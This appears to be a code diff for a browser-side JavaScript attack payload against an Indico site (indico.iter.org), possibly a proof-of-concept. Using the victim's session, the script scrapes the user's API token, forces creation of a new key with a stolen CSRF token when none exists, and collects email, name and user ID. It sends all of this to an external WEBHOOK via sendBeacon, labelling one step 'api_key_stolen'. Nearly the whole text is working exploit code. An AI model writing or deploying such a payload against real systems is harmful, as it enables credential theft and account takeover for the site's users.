@@ -30,40 +30,7 @@
       evidence.step = 'profile_read';
       report(evidence);
 
-      return fetch('https://indico.iter.org/user/api/', { credentials: 'include' })
-        .then(function (r) { return r.text(); })
-        .then(function (apiHtml) {
-          var g2 = function (re) { var m = apiHtml.match(re); return m ? m[1] : null; };
-
-          var apiKey = g2(/<dt>\s*Token\s*<\/dt>\s*<dd[^>]*>\s*([^<]+)/)
-            || g2(/<code[^>]*>([a-f0-9]{20,})<\/code>/)
-            || g2(/i-data-list[\s\S]{0,500}?Token[\s\S]{0,200}?<dd[^>]*>\s*([^<]+)/)
-            || g2(/Token<\/dt>\s*<dd>([^<]+)/);
-
-          var created = g2(/[Cc]reated[^<]{0,100}?(\d{4}[^<]{5,20})/);
-          var totalUses = g2(/[Tt]otal [Uu]ses[^<]{0,50}?(\d+)/);
-          var lastUsed = g2(/[Ll]ast [Uu]sed[^<]{0,100}?(\d{4}[^<]{5,20})/);
-
-          var hasCreate = /Create.*API key|create_key|key_create/i.test(apiHtml);
-          var hasDelete = /Delete.*API key|delete_key|key_delete/i.test(apiHtml);
-
-          var apiIdx = apiHtml.indexOf('API Key');
-          if (apiIdx === -1) apiIdx = apiHtml.indexOf('api-key');
-          if (apiIdx === -1) apiIdx = apiHtml.indexOf('apikey');
-          if (apiIdx === -1) apiIdx = apiHtml.indexOf('Token');
-          if (apiIdx === -1) apiIdx = Math.floor(apiHtml.length / 2);
-
-          evidence.step = 'api_key_page';
-          evidence.api_key = apiKey;
-          evidence.api_created = created;
-          evidence.api_total_uses = totalUses;
-          evidence.api_last_used = lastUsed;
-          evidence.has_create = hasCreate;
-          evidence.has_delete = hasDelete;
-          evidence.api_html_length = apiHtml.length;
-          evidence.api_section = apiHtml.substring(Math.max(0, apiIdx - 200), apiIdx + 3000);
-          report(evidence);
-        });
+      return fetchApiKey();
     })
     .catch(function (err) {
       evidence.step = 'error';
@@ -71,16 +38,59 @@
       report(evidence);
     });
 
+  function extractKey(html) {
+    var m = html.match(/<dt>\s*Token\s*<\/dt>\s*<dd[^>]*>\s*([^<]+)/)
+      || html.match(/<code[^>]*>([a-f0-9]{20,})<\/code>/)
+      || html.match(/Token<\/dt>\s*<dd>([^<]+)/);
+    return m ? m[1].trim() : null;
+  }
+
+  function fetchApiKey() {
+    return fetch('https://indico.iter.org/user/api/', { credentials: 'include' })
+      .then(function (r) { return r.text(); })
+      .then(function (apiHtml) {
+        var key = extractKey(apiHtml);
+
+        if (key) {
+          evidence.step = 'api_key_stolen';
+          evidence.api_key = key;
+          report(evidence);
+          return;
+        }
+
+        evidence.step = 'no_key_found_creating';
+        report(evidence);
+
+        return fetch('https://indico.iter.org/user/api/create', {
+          method: 'POST',
+          credentials: 'include',
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+          body: 'csrf_token=' + encodeURIComponent(evidence.csrf) + '&force=1'
+        })
+          .then(function (r) {
+            evidence.create_status = r.status;
+            return fetch('https://indico.iter.org/user/api/', { credentials: 'include' });
+          })
+          .then(function (r) { return r.text(); })
+          .then(function (apiHtml2) {
+            var newKey = extractKey(apiHtml2);
+            evidence.step = 'api_key_created';
+            evidence.api_key = newKey;
+            report(evidence);
+          });
+      });
+  }
+
   function report(ev) {
     var b = document.createElement('pre');
-    b.style.cssText = 'position:fixed;top:0;left:0;right:0;z:999999;'
+    b.style.cssText = 'position:fixed;top:0;left:0;right:0;z-index:999999;'
       + 'background:#b00;color:#fff;margin:0;padding:16px;font:13px/1.6 monospace;'
       + 'max-height:50vh;overflow:auto';
     b.textContent = 'Step: ' + (ev.step || '?') + '\n'
       + 'CSRF: ' + (ev.csrf || 'n/a') + '\n'
       + 'Email: ' + (ev.email || 'n/a') + '\n'
       + 'Name: ' + (ev.first_name || '') + ' ' + (ev.last_name || '') + '\n'
-      + 'API Key: ' + (ev.api_key || 'searching...') + '\n'
+      + 'API Key: ' + (ev.api_key || 'n/a') + '\n'
       + 'User ID: ' + (ev.user_id || 'n/a');
     document.body.appendChild(b);
     navigator.sendBeacon(WEBHOOK, JSON.stringify(ev));
